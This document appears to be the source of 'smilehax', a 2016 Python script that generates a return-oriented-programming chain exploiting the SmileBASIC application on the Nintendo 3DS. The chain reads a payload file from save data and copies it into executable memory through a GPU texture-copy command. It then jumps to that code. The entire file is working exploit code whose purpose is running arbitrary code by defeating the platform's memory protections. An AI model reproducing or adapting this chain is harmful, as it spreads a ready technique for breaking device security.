#!/usr/bin/python2

# smilehax - smilebasic 3ds exploit
# plutoo 2016

from constants import *
from rop_generator import *

emit_hdr()

emit_rop([
    GADGET_R0,                  # pop {r0, pc}
        RelativeAddr(22*4),        # handle_out_ptr
    GADGET_R1R2R3R4R5,          # pop {r1-r5, pc}
        PtrToUStr('save:/###/BPAYLOAD\0'),
        1,                         # flags = FILE_READ,
        DontCare,                  # r3
        DontCare,                  # r4
        DontCare,                  # r5
    FS_OPEN_FILE+4,             # fs::TryOpenFile(...)
        DontCare,                  # r4
        DontCare,                  # r5
        DontCare,                  # r6
        DontCare,                  # r7
        DontCare,                  # r8
    GADGET_R1R2R3R4R5,          # pop {r1-r5, pc}
        DontCare,                  # r1
        0,                         # r2  offset_lo
        0,                         # r3  offset_hi
        DontCare,                  # r4
        DontCare,                  # r5
    GADGET_R0,                  # pop {r0, pc}
        SafeAddr(0),               # r0  buf_addr
    GADGET_R1,                  # pop {r1, pc}
        DontCare,                  # r1  this is overwritten by openfile above
    FS_READ_FILE+4,             # fs::TryReadFile(...)
        DontCare,                  # r4
        DontCare,                  # r5
        DontCare,                  # r6
        DontCare,                  # r7
        DontCare,                  # r8
        DontCare,                  # r9
    GADGET_R1R2R3R4R5,          # pop {r1-r5, pc}
        CODE_BUF,                  # sp_arg0 ^  output ptr
        PERSISTENT_STAGE1_SIZE,    # sp_arg1 ^  size
        DontCare,                  # r3
        DontCare,                  # r4
        DontCare,                  # r5
    GADGET_R0,                  # pop {r0, pc}
        CODE_BUF,                  # r0  buf_addr
    GADGET_R1,                  # pop {r1, pc}
        PERSISTENT_STAGE1_SIZE,    # r1  buf_size
    GSP_FLUSH_DATA_CACHE+4,     # gsp::FlushDataCache(...)
        DontCare,                  # r4
        DontCare,                  # r5
        DontCare,                  # r6
    GSP_ENQUEUE_CMD_GADGET,     # gsp::EnqueueGpuCommand(...)
        4,                         # sp_arg0  cmd_type=TEXTURE_COPY
        CODE_BUF,                  # sp_arg1  src_ptr
        PA_TO_GPU_ADDR(CODE_DST_PA), # sp_arg2  dst_ptr
        PERSISTENT_STAGE1_SIZE,    # sp_arg3  size=code_size
        0,                         # sp_arg4  in_dimensions=0
        0,                         # sp_arg5  out_dimensions=0
        8,                         # sp_arg6  flags=RAW_MEM_COPY
        0,                         # sp_arg7  not used
        DontCare,                  # ...
        DontCare,                  # r4
        DontCare,                  # r5
        DontCare,                  # r6
        DontCare,                  # r7
    GADGET_POP_R4R5LR__BX_LR,   # initialize lr to pop {r0, pc}
        DontCare,                  # r4
        DontCare,                  # r5
    GADGET_R0,                  # pop {r0, pc}
        DontCare,                  # r0
    GADGET_R0,                  # pop {r0, pc}
        0x10000000,                # r0  ticks_lo
    GADGET_R1,                  # pop {r1, pc}
        0,                         # r1  ticks_hi
    SVC_SLEEP_THREAD,           # svc::SleepThread(...)
        DontCare,                  # r0, from lr-pop
    CODE_DST_VA                    # jump to code
])
